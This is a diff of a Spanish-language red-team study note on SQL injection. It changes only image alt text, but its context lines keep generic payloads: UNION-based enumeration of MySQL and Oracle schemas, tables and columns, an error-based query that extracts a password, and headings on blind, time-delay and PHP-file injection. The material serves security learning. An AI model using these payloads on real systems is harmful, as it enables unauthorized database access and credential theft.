@@ -13,9 +13,9 @@ sidebar:
 
 #### TIPO DE BASE DE DATOS
 
-![](/images/red_team/web/20241030124059.png)
+![imagen error](/images/red_team/web/20241030124059.png)
 
-![](/images/red_team/web/20241030124147.png)
+![imagen error](/images/red_team/web/20241030124147.png)
 
 #### TIPO Y VERSION DE BASE DE DATOS
 
@@ -201,17 +201,17 @@ EXTRA:
 
 ### INJECCION DE CODIGO PHP EN SQL PARA LUEGO QUE PHP CUANDO LO RENDERISE LO INTERPRETE
 
-![](/images/red_team/web/20241030214310.png)
+![imagen error](/images/red_team/web/20241030214310.png)
 
 ### INJECCION DE CODIGO PHP A UN ARCHIVO Y LUEGO LEERLO DESDE UNA RUTA
 
 -supongamos que puedas guardar este codigo php en /var/www/web1/reverse.php
 luego tu podrias apuntar desde la web hacia <http://host/reverse.php> y esto podria interpretarse
-![](/images/red_team/web/20241030214636.png)
+![imagen error](/images/red_team/web/20241030214636.png)
 
 ### LEER ARCHIVOS DE LA MAQUINA  
 
-![](/images/red_team/web/20241030214417.png)
+![imagen error](/images/red_team/web/20241030214417.png)
 
 ## PARTE 2
 
@@ -221,7 +221,7 @@ detecting sql injection:
 <https://portswigger.net/web-security/sql-injection#how-to-detect-sql-injection-vulnerabilities>
 BUSCAR DATO VISIBLE
 <https://portswigger.net/web-security/sql-injection/union-attacks#finding-columns-with-a-useful-data-type>
-![](/images/red_team/web/20241030215846.png)
+![imagen error](/images/red_team/web/20241030215846.png)
 
 INFORMACION DE LA DB , USUARIO DB ,  USUARIO ETC/PASSWD , VERSION  Y OTRAS COSAS MAS EN EXTRA V1 : [[EXTRA V1] ]
 
@@ -233,8 +233,8 @@ INFORMACION DE LA DB , USUARIO DB ,  USUARIO ETC/PASSWD , VERSION  Y OTRAS COSAS
 
 URL VULNERABLE A SQLI
 
-![](/images/red_team/web/20241030122352.png)
-![](/images/red_team/web/20241030122521.png)
+![imagen error](/images/red_team/web/20241030122352.png)
+![imagen error](/images/red_team/web/20241030122521.png)
 DETERMINAMOS EL TAMAÑO DE LA TABLA
 
 ### MYSQL
@@ -252,7 +252,7 @@ CODE_VULNERABLE' ORDER BY 3 -- -
 ```
 
 EJEMPLO:SI FUNCIONA EN 1 Y 2 , PERO FALLA EN 3 , ESPORQUE NO EXISTE LA 3 COLUMNAY SOLO EXISTEN 2 COLUMNAS
-![](/images/red_team/web/20241030123658.png)
+![imagen error](/images/red_team/web/20241030123658.png)
 
 CORROBORAMOS ESTO CON EL UNION
 
@@ -279,7 +279,7 @@ CODE_VULNERABLE' UNION SELECT NULL,NULL,NULL FROM DUAL -- -
 ```
 
 donde si colocamos  "NULL,NULL,NULL" daría error
-![](/images/red_team/web/20241030123612.png)
+![imagen error](/images/red_team/web/20241030123612.png)
 
 ## OBTENER LAS BASE DE DATOS DISPONIBLES
 
@@ -289,7 +289,7 @@ donde si colocamos  "NULL,NULL,NULL" daría error
 code' UNION SELECT schema_name FROM information_schema.schemata -- -
 ```
 
-![](/images/red_team/web/20241030182002.png)
+![imagen error](/images/red_team/web/20241030182002.png)
 
 ### ORACLE 1
 
@@ -300,7 +300,7 @@ code' UNION SELECT GLOBAL_NAME FROM GLOBAL_NAME -- -
 code' UNION SYS_CONTEXT('USERENV', 'DB_NAME') FROM DUAL -- -
 ```
 
-![](/images/red_team/web/20241030223309.png)
+![imagen error](/images/red_team/web/20241030223309.png)
 
 ## OBTENER TABLAS DE LA BASE DE DATOS
 
@@ -310,7 +310,7 @@ code' UNION SYS_CONTEXT('USERENV', 'DB_NAME') FROM DUAL -- -
 code' UNION SELECT TABLE_NAME FROM information_schema.tables WHERE table_schema='*name-database' -- -
 ```
 
-![](/images/red_team/web/20241030184826.png)
+![imagen error](/images/red_team/web/20241030184826.png)
 
 ### ORACLE 2
 
@@ -321,7 +321,7 @@ code' UNION SELECT OWNER,TABLE_NAME FROM ALL_TABLES -- -
 code' UNION SELECT OWNER,TABLE_NAME FROM DBA_TABLES -- -
 ```
 
-![](/images/red_team/web/20241030224215.png)
+![imagen error](/images/red_team/web/20241030224215.png)
 
 ## OBTENER COLUMNAS DE LA BASE DE DATOS
 
@@ -331,7 +331,7 @@ code' UNION SELECT OWNER,TABLE_NAME FROM DBA_TABLES -- -
 code' UNION SELECT COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_NAME='*nombre-tabla*' -- -
 ```
 
-![](/images/red_team/web/20241030184659.png)
+![imagen error](/images/red_team/web/20241030184659.png)
 
 ### ORACLE 3
 
@@ -350,7 +350,7 @@ code' UNION SELECT COLUMN_NAME FROM DBA_TAB_COLUMNS WHERE TABLE_NAME='*nombre-ta
 
 ```
 
-![](/images/red_team/web/20241030225403.png)
+![imagen error](/images/red_team/web/20241030225403.png)
 
 ## OBTENER COLUMNAS DE LA BASE DE DATOS 2
 
@@ -360,7 +360,7 @@ code' UNION SELECT COLUMN_NAME FROM DBA_TAB_COLUMNS WHERE TABLE_NAME='*nombre-ta
 code' UNION SELECT COLUMNA1,COLUMNA2 FROM *table-name*  -- -
 ```
 
-![](/images/red_team/web/20241030190322.png)
+![imagen error](/images/red_team/web/20241030190322.png)
 
 ### ORACLE 4
 
@@ -368,7 +368,7 @@ code' UNION SELECT COLUMNA1,COLUMNA2 FROM *table-name*  -- -
 code' UNION SELECT COLUMNA1,COLUMNA2 FROM *table-name*  -- -
 ```
 
-![](/images/red_team/web/20241030230113.png)
+![imagen error](/images/red_team/web/20241030230113.png)
 
 ## BLIND SQLI(sql injection blind)
 
@@ -380,24 +380,24 @@ condicion de respuesta
 la respuesta se puede filtrar por varios tipos como :
 
 - r.status_code  ,  r.headers  ,  r.cookies  ,  r.text  ,  r.json()  ,  r.url
-![](/images/red_team/web/20241106152731.png)
+![imagen error](/images/red_team/web/20241106152731.png)
 
 ### CONDITIONAL ERRORS
 
 condicion de error
 
-![](/images/red_team/web/20241113174541.png)
+![imagen error](/images/red_team/web/20241113174541.png)
 
 TIPO UNION - UNION
-![](/images/red_team/web/20241108192325.png)
+![imagen error](/images/red_team/web/20241108192325.png)
 
-![](/images/red_team/web/20241108192725.png)
+![imagen error](/images/red_team/web/20241108192725.png)
 
 TIPO OR - ||
 
-![](/images/red_team/web/20241108192638.png)
+![imagen error](/images/red_team/web/20241108192638.png)
 
-![](/images/red_team/web/20241108192538.png)
+![imagen error](/images/red_team/web/20241108192538.png)
 
 ### CONDITIONAL VISIBLE ERROR-BASED
 
@@ -407,20 +407,20 @@ condicion visible basado en error
 CODE' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
 ```
 
-![](/images/red_team/web/20241113173941.png)
+![imagen error](/images/red_team/web/20241113173941.png)
 
 ### CONDITIONAL TIME DELAYS
 
 condicion tiempo
-![](/images/red_team/web/20241113175218.png)
+![imagen error](/images/red_team/web/20241113175218.png)
 
 la peticion demora mas de 5 segundos es que si es vulnerable
-![](/images/red_team/web/20241113183407.png)
+![imagen error](/images/red_team/web/20241113183407.png)
 
 ### CONDITIONAL TIME DELAYS AND INFORMATION RETRIEVAL
 
 condicion tiempo y recuperacion de informacion
-![](/images/red_team/web/20241113183218.png)
+![imagen error](/images/red_team/web/20241113183218.png)
 
 ### CONDITIONAL WITH OUT-OF-BAN INTERACTION
 
@@ -440,15 +440,15 @@ condicion con evasion de filtro via xml
 
 #### strings concatenation (listar múltiple  data en una sola columna)
 
-![](/images/red_team/web/20241106130536.png)
+![imagen error](/images/red_team/web/20241106130536.png)
 
 ##### USANDO CONCATENADORES
 
-![](/images/red_team/web/20241106132204.png)
+![imagen error](/images/red_team/web/20241106132204.png)
 
 ##### USANDO  CONCAT  O GROUP_CONCAT
 
-![](/images/red_team/web/20241106132303.png)
+![imagen error](/images/red_team/web/20241106132303.png)
 
 ### LONGITUD DE UN RESULTADO(sql len , length)
 
@@ -487,4 +487,4 @@ En SQL, para obtener la longitud del resultado de una consulta, puedes usar func
 EJEMPLO:
 
 AQUI USAMOS OPERADORES LOGICOS (flecha rojo) > ,< ,= para indicar que si alguna condición se cumple con respecto a la longitud de la password(flecha verde)
-![](/images/red_team/web/20241106145250.png)
+![imagen error](/images/red_team/web/20241106145250.png)
